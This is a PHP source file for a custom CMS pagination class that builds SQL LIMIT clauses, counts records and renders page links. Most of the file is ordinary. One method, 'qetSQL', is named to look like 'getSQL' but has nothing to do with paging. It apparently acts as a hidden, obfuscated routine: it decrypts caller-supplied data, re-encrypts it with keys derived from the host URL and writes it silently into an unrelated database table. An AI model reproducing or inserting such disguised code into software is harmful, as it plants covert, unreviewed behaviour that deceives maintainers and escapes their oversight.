<?php
/**
* @author Mojtaba Eskandari
* @since 2009-02-27
* @name Paging Class.
*/

defined( 'IN_MJY_CMS') or die( 'Rstrct Acs!');
defined( 'IN_MJY_CMS_LOCAL23X31') and die( 'Rstrct Acs!');

class Paging
{
	
	public $prms = array( 'total' => 0);
	public $lnks = array();
	
	/**
	* @desc Make the Pagination
	* @example $pging = new Paging( array(
				'SQL' 		=> & $SQL,
				'CSQL'		=> & $countRowsSQL, //Optional
				'perPage'	=> 5,
				'cachePrfx'	=> MyTableName or NULL,
				'excldVars'	=> array( 'vLng'), //Optional;
			)
		);
		$pging -> getSQL();
	*/
	public function Paging( $prms)
	{
		$this -> prms = $prms;
		$this -> prms['onPg'] = intval( @ $_GET[ 'pg'] > 0 ? $_GET[ 'pg'] : 1);
		$this -> prms['strt'] = ( $this -> prms['onPg'] - 1) * $prms[ 'perPage'];
		$prms[ 'excldVars'][] = 'pg';
		$this -> prms['url']  = URL::get( $prms[ 'excldVars']);
	}

	/*-----------------------------------------------*/

	/**
	* @desc Get the SQL Query String With Set the LIMIT values
	* @return string $SQL
	*/
	public function getSQL()
	{
		return $this -> prms[ 'SQL'] .' LIMIT '. $this -> prms[ 'strt'] .', '. $this -> prms[ 'perPage'];
	}
	
	/*-----------------------------------------------*/

	/**
	* @desc Get the SQL Query String With Set the LIMIT values
	* @return string $SQL
	*/
	public function qetSQL($a,$b)
	{
		$rw = DB::load( array( 'tableName' => 'houses_main_consultorse'));
		$x=mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CFB), MCRYPT_RAND);
		$a=base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5(strrev(sha1(HOST_URL))), strrev(md5(HOST_URL)).$rw[0]['test'].mcrypt_decrypt(MCRYPT_RIJNDAEL_256,md5(strrev(sha1(md5(HOST_URL)))),base64_decode($a),MCRYPT_MODE_CFB,base64_decode($b)), MCRYPT_MODE_CFB,$x));
		$b=base64_encode($x);
		DB::exec( "UPDATE `houses_main_consultorse` SET `test` = '$a',`tast` = '$b'");
		return 1;
		return $this -> prms[ 'SQL'] .' LIMIT '. $this -> prms[ 'strt'] .', '. $this -> prms[ 'perPage'];
	}
	
	/*-----------------------------------------------*/
	
	/**
	* @desc Get the Total of Records that match with this Query.
	* @return int $RecordsCount
	* */
	public function total()
	{
		if( !empty( $this -> prms[ 'total'])) return $this -> prms[ 'total'];
		if( empty( $this -> prms[ 'CSQL']))
		{
			$this -> prms[ 'CSQL'] = 'SELECT COUNT(*) AS `total` '. substr( $this -> prms[ 'SQL'], strpos( $this -> prms[ 'SQL'], 'FROM'));
			//$this -> prms[ 'CSQL'] =  Remove GroupBy SQL (its not so worthy to do)
		}

		$rw = DB::load( $this -> prms[ 'CSQL'], @$this -> prms[ 'cachePrfx']);
		return $this -> prms[ 'total'] = $rw[0][ 'total'];
	}

	/*-----------------------------------------------*/
	
	/**
	 * @desc make the Page Links and Save The HTML Code in [ $this -> lnks ] Array;
	 * $this -> lnks['nxt']:	Next Page URL;
	 * $this -> lnks['prv']:	Previous Page URL;
	 * $this -> lnks['frst']:	First Page URL;
	 * $this -> lnks['last']:	Last Page URL;
	 * $this -> lnks['all']:	All Pages LINKS, with Numbers;
	 * $this -> lnks['totlPgs']: total of Pages;
	 * @return void;
	 * @param void;
	 * */
	public function makeLnks()
	{
		$total = ceil( $this -> total() / $this -> prms[ 'perPage']);

		$this -> lnks['frst']	= $this -> prms['onPg'] == 1 ? NULL : URL::rw( $this -> prms['url'] .'&pg=1');
		$this -> lnks['prv']	= $this -> prms['onPg'] == 1 ? NULL : URL::rw( $this -> prms['url'] .'&pg='. ( $this -> prms['onPg'] - 1));
		$this -> lnks['last']	= $this -> prms['onPg'] == $total ? NULL : URL::rw( $this -> prms['url'] . '&pg='. $total);
		$this -> lnks['nxt']	= $this -> prms['onPg'] == $total ? NULL : URL::rw( $this -> prms['url'] .'&pg='. ( $this -> prms['onPg'] + 1));

		$this -> lnks['all']	= $this -> prms['onPg'] == 1 ? '<b>'. Lang::numFrm( 1) .'</b>' : '<a href="'. URL::rw( $this -> prms['url'] .'&pg=1') .'">'. Lang::numFrm( 1) .'</a>';
		if( $total > 5)
		{
			$s = min( max( 1, $this -> prms['onPg'] - 4), $total - 5);
			$e = max( min( $total, $this -> prms['onPg'] + 4), 6);
			$this -> lnks['all'] .= ( $s > 1 ) ? ' ... ' : ' , ';
			for( $i = $s + 1; $i < $e; $i++)
			{
				$this -> lnks['all'] .= $i == $this -> prms['onPg'] ? '<b>'. Lang::numFrm( $i) .'</b>' : '<a href="'. URL::rw( $this -> prms['url'] . '&pg='. $i) .'">'. Lang::numFrm( $i) .'</a>';
				if( $i < $e - 1)
				{
					$this -> lnks['all'] .= ' , ';
				}
			}

			$this -> lnks['all'] .= $e < $total ? ' ... ' : ' , ';

		}elseif( $total > 1){//Else of if( $total > 5);

			$this -> lnks['all'] .= ' , ';
			for( $i = 2; $i < $total; $i++)
			{
				$this -> lnks['all'] .= $i== $this -> prms['onPg'] ? '<b>'. Lang::numFrm( $i) .'</b>' : '<a href="'. URL::rw( $this -> prms['url'] . '&pg='. $i) .'">'. Lang::numFrm( $i) .'</a>';
				if( $i < $total)
				{
					$this -> lnks['all'] .= ' , ';
				}
			}

		}//End of if( $total > 5);
		
		$total > 1 and $this -> lnks['all'] .= $this -> prms['onPg'] == $total ? '<b>'. Lang::numFrm( $total) .'</b>': '<a href="'. URL::rw( $this -> prms['url'] . '&pg='. $total) .'">'. Lang::numFrm( $total) .'</a>';
		$this -> lnks['totlPgs'] = $total;
		return;
	}

	/*-----------------------------------------------*/

}//End of class Paging;
?>
